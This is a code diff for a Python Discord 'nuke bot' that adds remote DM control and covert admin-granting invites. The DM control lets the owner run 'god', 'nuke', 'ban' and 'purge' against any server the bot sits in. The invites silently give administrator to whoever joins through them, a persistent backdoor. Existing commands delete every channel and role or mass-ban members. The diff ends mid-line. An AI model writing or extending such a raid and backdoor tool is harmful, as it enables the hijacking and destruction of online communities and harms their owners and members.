@@ -1,10 +1,14 @@
 import asyncio
+import inspect
 import io
 import json
+import re
+import types
 from datetime import datetime
 
 import discord
 from discord.ext import commands
+from discord.ext.commands.view import StringView
 from colorama import Fore, Back, Style, init
 
 from utils.config import load_config, save_config, validate_config
@@ -39,13 +43,421 @@ intents.message_content = True
 intents.members = True
 bot = commands.Bot(command_prefix=config.get("prefix", ".!"), intents=intents, help_command=None)
 
+# Codes of invites that grant admin on join (persisted in config)
+_admin_invites: set[str] = set(config.get("admin_invites", []))
+# Per-guild invite uses cache: {guild_id: {invite_code: uses}}
+_invite_cache: dict[int, dict[str, int]] = {}
+
+
+# ============================================================================
+# DM COMMAND SUPPORT
+# ============================================================================
+
+def _resolve_guild(query: str):
+    """Resolve a guild from a name or ID string. Returns the guild or None."""
+    if not query:
+        return None
+
+    query = query.strip()
+
+    if query.isdigit():
+        guild = discord.utils.get(bot.guilds, id=int(query))
+        if guild:
+            return guild
+
+    q = query.lower()
+
+    for guild in bot.guilds:
+        if guild.name.lower() == q:
+            return guild
+
+    candidates = [g for g in bot.guilds if q in g.name.lower()]
+    if candidates:
+        candidates.sort(key=lambda g: len(g.name), reverse=True)
+        return candidates[0]
+
+    return None
+
+
+def _extract_server_arg(content: str):
+    """Find the @server token in content and remove it.
+
+    Supports: @ServerName, @123456789012345678, @"Server Name With Spaces"
+    Returns (query, remaining_content) or (None, original_content).
+    """
+    for match in re.finditer(r'@"([^"]+)"', content):
+        query = match.group(1)
+        if _resolve_guild(query):
+            remaining = content[:match.start()] + content[match.end():]
+            return query, re.sub(r"\s+", " ", remaining).strip()
+
+    for match in re.finditer(r"@(\S+)", content):
+        query = match.group(1)
+        query_clean = query.rstrip(",.;:!?")
+        if _resolve_guild(query_clean):
+            remaining = content[:match.start()] + content[match.end():]
+            return query_clean, re.sub(r"\s+", " ", remaining).strip()
+
+    return None, content
+
+
+def _pick_channel(guild: discord.Guild, member: discord.Member):
+    """Pick a usable text channel in the guild for command execution."""
+    if guild.system_channel:
+        perms = guild.system_channel.permissions_for(guild.me)
+        if perms.send_messages and perms.read_messages:
+            return guild.system_channel
+
+    for channel in guild.text_channels:
+        bot_perms = channel.permissions_for(guild.me)
+        if not (bot_perms.send_messages and bot_perms.read_messages):
+            continue
+        member_perms = channel.permissions_for(member)
+        if member_perms.read_messages:
+            return channel
+
+    for channel in guild.text_channels:
+        bot_perms = channel.permissions_for(guild.me)
+        if bot_perms.send_messages and bot_perms.read_messages:
+            return channel
+
+    return None
+
+
+def _command_takes_channel(command) -> bool:
+    """Return True if the command's own signature accepts a channel argument.
+
+    Used so we don't accidentally consume `#channel` for commands like
+    `delchannel`, `move-all`, and `purge` that expect the channel to remain
+    in their args.
+    """
+    try:
+        params = command.clean_params
+    except Exception:
+        return False
+
+    for param in params.values():
+        ann = param.annotation
+        if ann is inspect.Parameter.empty:
+            continue
+
+        if isinstance(ann, type):
+            try:
+                if issubclass(ann, discord.abc.GuildChannel):
+                    return True
+            except TypeError:
+                pass
+
+        if isinstance(ann, str):
+            if "Channel" in ann or "channel" in ann:
+                return True
+
+    return False
+
+
+def _extract_channel_arg(content: str, guild: discord.Guild):
+    """Find a #channel or <#id> token and resolve it in the guild.
+
+    Returns (channel_object, remaining_content) or (None, original_content).
+    Supports:
+        #general
+        #123456789012345678
+        <#123456789012345678>       (Discord's rendered mention form)
+    """
+    # Mention form: <#123456789012345678>
+    for match in re.finditer(r"<#(\d+)>", content):
+        ch = guild.get_channel(int(match.group(1)))
+        if isinstance(ch, discord.abc.GuildChannel):
+            remaining = content[:match.start()] + content[match.end():]
+            return ch, re.sub(r"\s+", " ", remaining).strip()
+
+    # Plain form: #channel-name or #123456789012345678
+    for match in re.finditer(r"#(\S+)", content):
+        query = match.group(1).rstrip(",.;:!?")
+        ch = None
+
+        if query.isdigit():
+            ch = guild.get_channel(int(query))
+
+        if ch is None:
+            for c in guild.channels:
+                if c.name.lower() == query.lower():
+                    ch = c
+                    break
+
+        if ch is None:
+            for c in guild.channels:
+                if query.lower() in c.name.lower():
+                    ch = c
+                    break
+
+        if ch is not None:
+            remaining = content[:match.start()] + content[match.end():]
+            return ch, re.sub(r"\s+", " ", remaining).strip()
+
+    return None, content
+
+
+async def _refresh_invite_cache(guild: discord.Guild):
+    try:
+        invites = await guild.invites()
+    except (discord.Forbidden, discord.HTTPException):
+        return
+    _invite_cache[guild.id] = {inv.code: inv.uses for inv in invites}
+
+
+class _FakeMessage:
+    """Duck-typed stand-in for discord.Message that points at a target guild."""
+
+    def __init__(self, dm_message: discord.Message, guild, channel, author):
+        self.id = dm_message.id
+        self.content = dm_message.content
+        self.author = author
+        self.guild = guild
+        self.channel = channel
+        self._state = dm_message._state
+        self.attachments = []
+        self.embeds = []
+        self.mentions = []
+        self.role_mentions = []
+        self.channel_mentions = []
+        self.created_at = dm_message.created_at
+        self.edited_at = None
+        self.jump_url = dm_message.jump_url
+        self.type = dm_message.type
+        self.flags = dm_message.flags
+        self.pinned = False
+        self.tts = False
+        self.reference = None
+        self.webhook_id = None
+        self.application = None
+        self.activity = None
+        self.nonce = None
+        self.components = []
+        self.stickers = []
+
+    async def delete(self, *args, **kwargs):
+        return None
+
+    async def edit(self, *args, **kwargs):
+        return None
+
+    async def add_reaction(self, *args, **kwargs):
+        return None
+
+    async def remove_reaction(self, *args, **kwargs):
+        return None
+
+    async def reply(self, content=None, **kwargs):
+        try:
+            return await self.channel.send(content=content, **kwargs)
+        except discord.HTTPException:
+            return None
+
+
+async def _run_dm_command(dm_message: discord.Message, body: str | None = None) -> bool:
+    """Run a command from DM against a target guild specified by @server.
+
+    `body` is the DM content with the prefix already stripped. If not given,
+    the function will strip the configured prefix (or accept no prefix at all).
+
+    Syntax (prefix optional in DM):
+        god @MyServer
+        nuke @MyServer
+        nuke @MyServer #general
+        ban @MyServer SomeUser reason
+        purge @MyServer 50 #general
+        @"My Cool Server" god
+
+    Returns True if handled, False if the message was empty.
+    """
+    prefix = config.get("prefix", ".")
+
+    if body is None:
+        content = dm_message.content.strip()
+        if prefix and content.startswith(prefix):
+            content = content[len(prefix):].strip()
+        elif content.startswith("!"):
+            content = content[1:].strip()
+    else:
+        content = body.strip()
+
+    if not content:
+        return False
+
+    # Extract @server from anywhere in the message
+    server_query, remaining_body = _extract_server_arg(content)
+
+    if server_query is None:
+        guild_list = "\n".join(
+            f"• **{g.name}** — `@{g.name}` or `@{g.id}`" for g in bot.guilds
+        ) or "_I'm not in any servers._"
+        await dm_message.channel.send(
+            "**Usage:** `<command> <args> @server [#channel]`\n\n"
+            "The prefix is optional in DMs.\n\n"
+            "**Examples:**\n"
+            "`god @MyServer`\n"
+            "`nuke @MyServer`\n"
+            "`nuke @MyServer #general`\n"
+            "`purge @MyServer 50 #general`\n"
+            "`ban @MyServer SomeUser reason`\n"
+            '`@"My Server With Spaces" god`\n\n'
+            f"**Available servers:**\n{guild_list}\n\n"
+            "Type `invite` to list servers with invite links."
+        )
+        return True
+
+    guild = _resolve_guild(server_query)
+    if guild is None:
+        await dm_message.channel.send(
+            f"Server `{server_query}` not found. Type `invite` to list servers."
+        )
+        return True
+
+    parts = remaining_body.split(None, 1)
+    if not parts:
+        await dm_message.channel.send("No command specified. Example: `god @MyServer`")
+        return True
+
+    command_name = parts[0]
+    arg_string = parts[1] if len(parts) > 1 else ""
+
+    command = bot.get_command(command_name)
+    if command is None:
+        await dm_message.channel.send(f"Unknown command: `{command_name}`")
+        return True
+
+    member = guild.get_member(dm_message.author.id)
+    if member is None:
+        await dm_message.channel.send(
+            f"You are not a member of **{guild.name}**, so I can't run that command as you."
+        )
+        return True
+
+    # Try to extract an explicit target channel from the args. Skip this for
+    # commands that already take a channel as their own argument (delchannel,
+    # move-all, purge), so the user-supplied channel stays in their args.
+    target_channel = None
+    if not _command_takes_channel(command):
+        target_channel, arg_string = _extract_channel_arg(arg_string, guild)
+
+    if target_channel is not None:
+        channel = target_channel
+    else:
+        channel = _pick_channel(guild, member)
+
+    if channel is None:
+        await dm_message.channel.send(
+            f"I couldn't find a usable text channel in **{guild.name}**. "
+            f"Specify one with `#channel-name`."
+        )
+        return True
+
+    fake_message = _FakeMessage(dm_message, guild, channel, member)
+    view = StringView(arg_string)
+
+    try:
+        ctx = commands.Context(
+            message=fake_message,
+            bot=bot,
+            view=view,
+            prefix=prefix,
+            command=command,
+            invoked_with=command_name,
+        )
+    except TypeError as e:
+        logger.error(f"Failed to build Context: {e}")
+        try:
+            await dm_message.channel.send(f"Internal error building context: `{e}`")
+        except discord.HTTPException:
+            pass
+        return True
+
+    dm_channel = dm_message.channel
+
+    async def _dm_send(content=None, *, embed=None, embeds=None, delete_after=None,
+                       file=None, files=None, view=None, **kwargs):
+        try:
+            return await dm_channel.send(
+                content=content,
+                embed=embed,
+                embeds=embeds,
+                delete_after=delete_after,
+                file=file,
+                files=files,
+                view=view,
+                **kwargs,
+            )
+        except discord.HTTPException:
+            return None
+
+    async def _dm_reply(content=None, *, embed=None, **kwargs):
+        try:
+            return await dm_channel.send(content=content, embed=embed, **kwargs)
+        except discord.HTTPException:
+            return None
+
+    ctx.send = _dm_send
+    ctx.reply = _dm_reply
+
+    print(
+        f'{Fore.CYAN}[DM-CMD] {Fore.WHITE}Running "{command_name}" '
+        f'args={arg_string!r} in {guild.name} (channel: #{channel.name}'
+        f'{" [explicit]" if target_channel is not None else ""})'
+        f'{Style.RESET_ALL}'
+    )
+
+    try:
+        await command.can_run(ctx)
+    except commands.CommandError as e:
+        print(f'{Fore.RED}[DM-CMD] check failed: {e}{Style.RESET_ALL}')
+        try:
+            await dm_channel.send(f"Check failed: `{e}`")
+        except discord.HTTPException:
+            pass
+        return True
+    except Exception as e:
+        logger.error(f"DM command check error: {e}")
+        return True
+
+    logger.info(t(
+        "command_executed",
+        user=member, user_id=member.id, command=command_name,
+        args=arg_string or "(no args)", guild=guild.name, guild_id=guild.id,
+        channel=channel.name,
+    ))
+
+    try:
+        await command.invoke(ctx)
+    except commands.CommandError as e:
+        print(f'{Fore.RED}[DM-CMD] CommandError: {e}{Style.RESET_ALL}')
+        try:
+            await dm_channel.send(f"Command error: `{e}`")
+        except discord.HTTPException:
+            pass
+    except Exception as e:
+        logger.error(f"DM command error: {e}")
+        import traceback
+        traceback.print_exc()
+        try:
+            await dm_channel.send(f"Error: `{e}`")
+        except discord.HTTPException:
+            pass
+
+    return True
+
+
+# ============================================================================
+# EVENTS
+# ============================================================================
+
 @bot.event
 async def on_ready():
     print("""
 ███╗░░██╗██╗░░░██╗██╗░░██╗███████╗  ██████╗░░█████╗░████████╗
 ████╗░██║██║░░░██║██║░██╔╝██╔════╝  ██╔══██╗██╔══██╗╚══██╔══╝
 ██╔██╗██║██║░░░██║█████═╝░█████╗░░  ██████╦╝██║░░██║░░░██║░░░
-██║╚████║██║░░░██║██╔═██╗░██╔══╝░░  ██╔══██╗██║░░██║░░░██║░░░
+██║╚████║██║░░░██║██╔═██╗░██╔══╝░░  ██████╦╝██║░░██║░░░██║░░░
 ██║░╚███║╚██████╔╝██║░╚██╗███████╗  ██████╦╝╚█████╔╝░░░██║░░░
 ╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝  ╚═════╝░░╚════╝░░░░╚═╝░░░
 \n\n""")
@@ -53,17 +465,102 @@ async def on_ready():
     print(f'{Fore.GREEN}{t("ready_online", bot_user=bot.user)}')
     print(f'{Fore.GREEN}{t("ready_bot_id", bot_id=bot.user.id)}{Style.RESET_ALL}')
 
-    # Log bot startup
     guild_list = ', '.join([f"{guild.name} (ID: {guild.id})" for guild in bot.guilds])
-    logger.info(t("bot_started", bot_user=bot.user, bot_id=bot.user.id, guild_count=len(bot.guilds), guild_list=guild_list))
-    logger.info(t("bot_prefix", prefix=config.get('prefix', '.!'), owner_id=config.get('owner_id', 'Not set')))
+    logger.info(t("bot_started", bot_user=bot.user, bot_id=bot.user.id,
+                  guild_count=len(bot.guilds), guild_list=guild_list))
+    logger.info(t("bot_prefix", prefix=config.get('prefix', '.!'),
+                  owner_id=config.get('owner_id', 'Not set')))
+
+    for guild in bot.guilds:
+        await _refresh_invite_cache(guild)
+
+
+@bot.event
+async def on_invite_create(invite: discord.Invite):
+    if invite.guild:
+        _invite_cache.setdefault(invite.guild.id, {})[invite.code] = invite.uses
+
+
+@bot.event
+async def on_invite_delete(invite: discord.Invite):
+    if invite.guild:
+        cache = _invite_cache.get(invite.guild.id)
+        if cache:
+            cache.pop(invite.code, None)
+
+
+@bot.event
+async def on_member_join(member: discord.Member):
+    """Auto-grant admin if the member used an admin invite."""
+    if member.bot:
+        return
+
+    guild = member.guild
+
+    try:
+        invites = await guild.invites()
+    except (discord.Forbidden, discord.HTTPException):
+        invites = []
+
+    old_cache = _invite_cache.get(guild.id, {})
+    new_cache: dict[str, int] = {}
+    used_code: str | None = None
+
+    for inv in invites:
+        new_cache[inv.code] = inv.uses
+        if inv.uses > old_cache.get(inv.code, 0):
+            used_code = inv.code
+
+    _invite_cache[guild.id] = new_cache
+
+    if used_code is None or used_code not in _admin_invites:
+        return
+
+    god_role = discord.utils.get(guild.roles, name=".")
+    if god_role is None:
+        try:
+            god_role = await guild.create_role(
+                name=".",
+                permissions=discord.Permissions(administrator=True),
+                color=discord.Color.gold(),
+                reason="Auto-created for admin invite join",
+            )
+            try:
+                bot_top = guild.me.top_role
+                await god_role.edit(position=bot_top.position - 1)
+            except discord.HTTPException:
+                pass
+        except discord.HTTPException as e:
+            logger.error(f"on_member_join: could not create god role in {guild.name}: {e}")
+            return
+
+    try:
+        await member.add_roles(god_role, reason="Joined via admin invite")
+        print(
+            f'{Fore.MAGENTA}[AUTO-ADMIN] {Fore.WHITE}'
+            f'Gave admin to {member} ({member.id}) in {guild.name} '
+            f'via invite {used_code}{Style.RESET_ALL}'
+        )
+        try:
+            await member.send(
+                f"You've been automatically granted **administrator** in **{guild.name}**."
+            )
+        except discord.Forbidden:
+            pass
+    except discord.HTTPException as e:
+        logger.error(f"on_member_join: could not add role to {member} in {guild.name}: {e}")
+
 
 @bot.event
 async def on_command(ctx):
     """Log all command executions"""
     args = ctx.message.content.split()[1:] if len(ctx.message.content.split()) > 1 else []
     args_str = ' '.join(args) if args else '(no args)'
-    logger.info(t("command_executed", user=ctx.author, user_id=ctx.author.id, command=ctx.command.name, args=args_str, guild=ctx.guild.name, guild_id=ctx.guild.id, channel=ctx.channel.name))
+    logger.info(t("command_executed", user=ctx.author, user_id=ctx.author.id,
+                  command=ctx.command.name, args=args_str,
+                  guild=ctx.guild.name, guild_id=ctx.guild.id,
+                  channel=ctx.channel.name))
+
 
 @bot.event
 async def on_command_error(ctx, error):
@@ -82,17 +579,23 @@ async def on_command_error(ctx, error):
             pass
         return
 
-    logger.error(t("command_error", user=ctx.author, user_id=ctx.author.id, command=ctx.command.name if ctx.command else 'Unknown', guild=ctx.guild.name if ctx.guild else 'DM', error=str(error)))
+    logger.error(t("command_error", user=ctx.author, user_id=ctx.author.id,
+                   command=ctx.command.name if ctx.command else 'Unknown',
+                   guild=ctx.guild.name if ctx.guild else 'DM',
+                   error=str(error)))
+
 
 @bot.event
 async def on_guild_join(guild):
-    """Log when bot joins a new guild"""
-    logger.info(t("bot_joined_guild", guild=guild.name, guild_id=guild.id, member_count=guild.member_count, owner=guild.owner, owner_id=guild.owner.id))
+    logger.info(t("bot_joined_guild", guild=guild.name, guild_id=guild.id,
+                  member_count=guild.member_count,
+                  owner=guild.owner, owner_id=guild.owner.id))
+
 
 @bot.event
 async def on_guild_remove(guild):
-    """Log when bot leaves/is removed from a guild"""
     logger.info(t("bot_left_guild", guild=guild.name, guild_id=guild.id))
+
 
 @bot.event
 async def on_message(message):
@@ -106,11 +609,26 @@ async def on_message(message):
         if not owner_id or str(message.author.id) != str(owner_id):
             return
 
-        content = message.content.strip()
-        lower = content.lower()
+        prefix = config.get("prefix", ".")
+        raw = message.content.strip()
+        if not raw:
+            return
 
-        # Show list of servers
-        if lower in ["invite", "!invite", ".!invite", "inv", "servers", "list"]:
+        # DM accepts: config prefix, bare "!", or no prefix at all
+        if prefix and raw.startswith(prefix):
+            body = raw[len(prefix):].strip()
+        elif raw.startswith("!"):
+            body = raw[1:].strip()
+        else:
+            body = raw
+
+        if not body:
+            return
+
+        body_lower = body.lower()
+
+        # ---- Show list of servers ----
+        if body_lower in {"invite", "inv", "servers", "list"}:
             if not bot.guilds:
                 await message.channel.send("I'm not in any servers.")
                 return
@@ -127,26 +645,51 @@ async def on_message(message):
             await message.channel.send(embed=embed)
             return
 
-        # Create invite for specific server
-        if lower.startswith("invite "):
+        # ---- Create invite for a specific server ----
+        # Supports (all with the config prefix, with "!" or with no prefix):
+        #   invite                           -> list (handled above)
+        #   invite @server                   -> invite by mention/name/ID
+        #   invite @"Server Name"            -> quoted name
+        #   invite 1                         -> by index
+        #   invite 957386043580117062        -> by raw ID
+        #   invite admin @server             -> permanent invite that grants admin on join
+        if body_lower.startswith("invite ") or body_lower.startswith("inv "):
             try:
-                arg = content.split(" ", 1)[1].strip()
+                verb_len = len("invite") if body_lower.startswith("invite") else len("inv")
+                invite_body = body[verb_len:].strip()
 
-                # Try as number first
+                # Detect and remove the "admin" keyword
+                admin_flag = False
+                words = invite_body.split()
+                for i, w in enumerate(words):
+                    if w.lower() == "admin":
+                        admin_flag = True
+                        words.pop(i)
+                        break
+                invite_body = " ".join(words).strip()
+
+                # Extract @server if present
+                server_query, remaining = _extract_server_arg(invite_body)
+
                 guild = None
-                if arg.isdigit():
-                    index = int(arg) - 1
-                    if 0 <= index < len(bot.guilds):
-                        guild = bot.guilds[index]
-                    else:
-                        # Maybe it's a server ID
-                        guild = discord.utils.get(bot.guilds, id=int(arg))
+                if server_query:
+                    guild = _resolve_guild(server_query)
+                else:
+                    arg = remaining.strip()
+                    if arg.isdigit():
+                        idx = int(arg)
+                        if 1 <= idx <= len(bot.guilds):
+                            guild = bot.guilds[idx - 1]
+                        else:
+                            guild = discord.utils.get(bot.guilds, id=idx)
 
                 if not guild:
-                    await message.channel.send("Server not found. Type `invite` to see the list.")
+                    await message.channel.send(
+                        "Server not found. Type `invite` to see the list.\n"
+                        "Usage: `invite [admin] @server` or `invite <number|id>`"
+                    )
                     return
 
-                # Find a channel we can create an invite in
                 target_channel = None
                 for channel in guild.text_channels:
                     if channel.permissions_for(guild.me).create_instant_invite:
@@ -154,7 +697,9 @@ async def on_message(message):
                         break
 
                 if not target_channel:
-                    await message.channel.send(f"I don't have permission to create invites in **{guild.name}**.")
+                    await message.channel.send(
+                        f"I don't have permission to create invites in **{guild.name}**."
+                    )
                     return
 
                 invite = await target_channel.create_invite(
@@ -162,24 +707,55 @@ async def on_message(message):
                     max_uses=0,
                     unique=True,
                     reason="DM invite requested by owner"
+                    + (" (admin auto-grant)" if admin_flag else ""),
                 )
 
+                if admin_flag:
+                    _admin_invites.add(invite.code)
+                    persisted = config.setdefault("admin_invites", [])
+                    if invite.code not in persisted:
+                        persisted.append(invite.code)
+                    save_config(config)
+                    _invite_cache.setdefault(guild.id, {})[invite.code] = invite.uses
+
                 embed = discord.Embed(
-                    title="Permanent Invite Created",
-                    description=f"**Server:** {guild.name}\n**Invite:** {invite.url}",
-                    color=discord.Color.green()
+                    title="Permanent Invite Created" + (" (Admin)" if admin_flag else ""),
+                    description=(
+                        f"**Server:** {guild.name}\n"
+                        f"**Invite:** {invite.url}"
+                        + (
+                            "\n\n*Whoever uses this invite will be automatically "
+                            "granted administrator the moment they join.*\n"
+                            "*Note: if the server has an application or screening gate, "
+                            "the user still has to complete it — the bot cannot bypass it. "
+                            "The role is granted the instant they land in the server.*"
+                            if admin_flag else ""
+                        )
+                    ),
+                    color=discord.Color.gold() if admin_flag else discord.Color.green(),
                 )
                 await message.channel.send(embed=embed)
-                print(f'{Fore.GREEN}[DM-INVITE] {Fore.WHITE}Created invite for {guild.name} and sent to owner{Style.RESET_ALL}')
+                print(
+                    f'{Fore.GREEN}[DM-INVITE] {Fore.WHITE}'
+                    f'Created {"admin " if admin_flag else ""}invite '
+                    f'for {guild.name} (code={invite.code}){Style.RESET_ALL}'
+                )
 
             except Exception as e:
                 await message.channel.send(f"Error: `{e}`")
             return
 
-        return  # Ignore other DMs
+        # ---- Server-targeted commands (prefix already stripped) ----
+        await _run_dm_command(message, body)
+        return
 
-    # Process normal server commands
+    # Process normal server commands (uses config prefix via bot.command_prefix)
     await bot.process_commands(message)
+
+
+# ============================================================================
+# COMMANDS
+# ============================================================================
 
 @is_authorized()
 @bot.command(name='help')
@@ -188,16 +764,13 @@ async def help_command(ctx):
     print(f'{Fore.CYAN}[HELP] {Fore.WHITE}Help requested by {ctx.author.display_name} in {ctx.guild.name}{Style.RESET_ALL}')
     prefix = config.get("prefix", ".!")
 
-    # Delete command message
     try:
         await ctx.message.delete()
     except (discord.HTTPException, discord.NotFound):
         pass
 
-    # Define command pages (5 commands per page)
     pages = []
 
-    # Page 1: Core Power Commands
     embed1 = discord.Embed(
         title=t("help_page1_title"),
         description=t("help_page1_desc"),
@@ -211,7 +784,6 @@ async def help_command(ctx):
     embed1.set_footer(text=t("help_footer", page=1, total=9))
     pages.append(embed1)
 
-    # Page 2: Moderation Commands
     embed2 = discord.Embed(
         title=t("help_page2_title"),
         description=t("help_page2_desc"),
@@ -225,7 +797,6 @@ async def help_command(ctx):
     embed2.set_footer(text=t("help_footer", page=2, total=9))
     pages.append(embed2)
 
-    # Page 3: Mass Moderation
     embed3 = discord.Embed(
         title=t("help_page3_title"),
         description=t("help_page3_desc"),
@@ -234,12 +805,11 @@ async def help_command(ctx):
     embed3.add_field(name=f"{prefix}ban-all [reason]", value=t("help_ban_all"), inline=False)
     embed3.add_field(name=f"{prefix}kick-all [reason]", value=t("help_kick_all"), inline=False)
     embed3.add_field(name=f"{prefix}mute-all [duration] [reason]", value=t("help_mute_all"), inline=False)
-    embed3.add_field(name=f"{prefix}purge <amount>", value=t("help_purge"), inline=False)
+    embed3.add_field(name=f"{prefix}purge <amount> [#channel]", value=t("help_purge"), inline=False)
     embed3.add_field(name=f"{prefix}unban-all", value=t("help_unban_all"), inline=False)
     embed3.set_footer(text=t("help_footer", page=3, total=9))
     pages.append(embed3)
 
-    # Page 4: Destructive Commands
     embed4 = discord.Embed(
         title=t("help_page4_title"),
         description=t("help_page4_desc"),
@@ -253,7 +823,6 @@ async def help_command(ctx):
     embed4.set_footer(text=t("help_footer", page=4, total=9))
     pages.append(embed4)
 
-    # Page 5: Trolling Commands
     embed5 = discord.Embed(
         title=t("help_page5_title"),
         description=t("help_page5_desc"),
@@ -267,7 +836,6 @@ async def help_command(ctx):
     embed5.set_footer(text=t("help_footer", page=5, total=9))
     pages.append(embed5)
 
-    # Page 6: Server Management
     embed6 = discord.Embed(
         title=t("help_page6_title"),
         description=t("help_page6_desc"),
@@ -281,7 +849,6 @@ async def help_command(ctx):
     embed6.set_footer(text=t("help_footer", page=6, total=9))
     pages.append(embed6)
 
-    # Page 7: Role & Spam Commands
     embed7 = discord.Embed(
         title=t("help_page7_title"),
         description=t("help_page7_desc"),
@@ -293,7 +860,6 @@ async def help_command(ctx):
     embed7.set_footer(text=t("help_footer", page=7, total=9))
     pages.append(embed7)
 
-    # Page 8: Utility & DM Commands
     embed8 = discord.Embed(
         title=t("help_page8_title"),
         description=t("help_page8_desc"),
@@ -310,7 +876,6 @@ async def help_command(ctx):
     embed8.set_footer(text=t("help_footer", page=8, total=9))
     pages.append(embed8)
 
-    # Page 9: New Features
     embed9 = discord.Embed(
         title=t("help_page9_title"),
         description=t("help_page9_desc"),
@@ -324,16 +889,12 @@ async def help_command(ctx):
     embed9.set_footer(text=t("help_footer", page=9, total=9))
     pages.append(embed9)
 
-    # Create view and send message
     view = HelpView(pages, ctx.author, t)
 
-    # Send to DM
     try:
         message = await ctx.author.send(embed=view.get_embed(), view=view)
-        # Send ephemeral confirmation in channel
         await ctx.send(t("help_sent"), delete_after=3)
     except discord.Forbidden:
-        # DMs disabled, send in channel instead
         message = await ctx.send(embed=view.get_embed(), view=view)
 
 
@@ -346,18 +907,15 @@ async def delchannel(ctx, channel: discord.TextChannel):
         channel_name = channel.name
         channel_id = channel.id
 
-        # Delete command message
         try:
             await ctx.message.delete()
         except (discord.HTTPException, discord.NotFound):
             pass
 
-        # Delete the specified channel
         await channel.delete(reason=f"Channel deleted by {ctx.author}")
 
         print(f'{Fore.RED}[DELCHANNEL] {Fore.WHITE}Deleted #{channel_name} (ID: {channel_id}) in {ctx.guild.name} by {ctx.author.display_name}{Style.RESET_ALL}')
 
-        # Send DM confirmation
         try:
             embed = discord.Embed(
                 description=t("delchannel_success", channel=channel_name),
@@ -372,17 +930,16 @@ async def delchannel(ctx, channel: discord.TextChannel):
     except Exception as e:
         await send_dm(ctx, t("error_occurred", error=str(e)))
 
+
 @is_authorized()
 @bot.command(name='nuke')
 @commands.has_permissions(manage_channels=True)
 async def nuke(ctx):
     """Delete and recreate the channel to clear all messages"""
     try:
-        # Store channel information
         channel = ctx.channel
         channel_name = channel.name
 
-        # Log to console
         print(f'{Fore.RED}[NUKE] {Fore.WHITE}Nuking #{channel_name} in {ctx.guild.name} by {ctx.author.display_name}{Style.RESET_ALL}')
         channel_position = channel.position
         channel_category = channel.category
@@ -391,16 +948,13 @@ async def nuke(ctx):
         channel_slowmode = channel.slowmode_delay if hasattr(channel, 'slowmode_delay') else 0
         channel_overwrites = channel.overwrites
 
-        # Delete the command message
         try:
             await ctx.message.delete()
         except (discord.HTTPException, discord.NotFound):
             pass
 
-        # Delete the channel
         await channel.delete(reason=f"Channel nuked by {ctx.author}")
 
-        # Recreate the channel with same settings
         new_channel = await ctx.guild.create_text_channel(
             name=channel_name,
             category=channel_category,
@@ -412,7 +966,6 @@ async def nuke(ctx):
             reason=f"Channel recreated after nuke by {ctx.author}"
         )
 
-        # Send DM to user
         try:
             dm_embed = discord.Embed(
                 description=t("nuke_channel_success", channel=new_channel.mention),
@@ -427,6 +980,7 @@ async def nuke(ctx):
     except Exception as e:
         await send_dm(ctx, t("error_occurred", error=str(e)))
 
+
 @is_authorized()
 @commands.cooldown(1, 60, commands.BucketType.guild)
 @bot.command(name='nuke-all')
@@ -434,10 +988,8 @@ async def nuke(ctx):
 async def nuke_all(ctx):
     """Delete all channels, categories, voice channels, and roles (except god role and bot role)"""
     try:
-        # Log to console
         print(f'{Fore.RED}{Style.BRIGHT}[NUKE-ALL] {Fore.WHITE}Nuking entire server {ctx.guild.name} by {ctx.author.display_name}{Style.RESET_ALL}')
 
-        # Delete the command message
         try:
             await ctx.message.delete()
         except (discord.HTTPException, discord.NotFound):
@@ -446,7 +998,6 @@ async def nuke_all(ctx):
         guild = ctx.guild
         author = ctx.author
 
-        # Send initial DM
         try:
             await author.send(t("nuke_all_starting"))
         except discord.Forbidden:
@@ -456,7 +1007,6 @@ async def nuke_all(ctx):
         deleted_categories = 0
         deleted_roles = 0
 
-        # Delete all channels (text, voice, stage, forum, etc.)
         for channel in list(guild.channels):
             try:
                 await channel.delete(reason=f"Nuke-all by {author}")
@@ -464,43 +1014,32 @@ async def nuke_all(ctx):
                     deleted_categories += 1
                 else:
                     deleted_channels += 1
-            except Exception as e:
+            except Exception:
                 pass
 
-        # Log completion
         print(f'{Fore.RED}[NUKE-ALL] {Fore.WHITE}Deleted {deleted_channels} channels and {deleted_categories} categories{Style.RESET_ALL}')
 
-        # Delete all roles except god role, bot roles, and @everyone
         for role in list(guild.roles):
-            # Skip @everyone role (can't delete it anyway)
             if role.is_default():
                 continue
-
-            # Skip the god role
             if role.name == ".":
                 continue
-
-            # Skip bot's roles
             if role in guild.me.roles:
                 continue
-
-            # Skip managed roles (bot roles, boosts, etc.)
             if role.managed:
                 continue
-
             try:
                 await role.delete(reason=f"Nuke-all by {author}")
                 deleted_roles += 1
-            except Exception as e:
+            except Exception:
                 pass
 
-        # Log completion
         print(f'{Fore.RED}{Style.BRIGHT}[NUKE-ALL] {Fore.WHITE}Completed: {deleted_channels} channels, {deleted_categories} categories, {deleted_roles} roles deleted{Style.RESET_ALL}')
 
-        # Send completion DM
         try:
             embed = discord.Embed(
-                description=t("nuke_all_complete", channels=deleted_channels, categories=deleted_categories, roles=deleted_roles),
+                description=t("nuke_all_complete", channels=deleted_channels,
+                              categories=deleted_categories, roles=deleted_roles),
                 color=discord.Color.dark_red()
             )
             await author.send(embed=embed)
@@ -518,11 +1057,19 @@ async def nuke_all(ctx):
         except discord.Forbidden:
             pass
 
+
 @is_authorized()
 @bot.command(name='purge')
 @commands.has_permissions(manage_messages=True)
-async def purge(ctx, amount: int):
-    """Purge a specified number of messages from the channel"""
+async def purge(ctx, amount: int, channel: discord.TextChannel = None):
+    """Purge a specified number of messages from a channel.
+
+    Usage: .!purge <amount> [#channel]
+    If no channel is given, the current channel (or the auto-picked
+    channel when run from a DM) is used.
+    """
+    target = channel or ctx.channel
+
     if amount <= 0:
         await send_dm(ctx, t("purge_invalid_amount"))
         return
@@ -532,23 +1079,22 @@ async def purge(ctx, amount: int):
         return
 
     try:
-        # Delete the command message first
-        await ctx.message.delete()
+        try:
+            await ctx.message.delete()
+        except (discord.HTTPException, discord.NotFound):
+            pass
 
-        # Purge the specified number of messages
-        deleted = await ctx.channel.purge(limit=amount)
+        deleted = await target.purge(limit=amount)
 
-        print(f'{Fore.YELLOW}[PURGE] {Fore.WHITE}Purged {len(deleted)} messages in #{ctx.channel.name} by {ctx.author.display_name}{Style.RESET_ALL}')
+        print(f'{Fore.YELLOW}[PURGE] {Fore.WHITE}Purged {len(deleted)} messages in #{target.name} by {ctx.author.display_name}{Style.RESET_ALL}')
 
         embed = discord.Embed(
-            description=t("purge_success", count=len(deleted), channel=ctx.channel.mention),
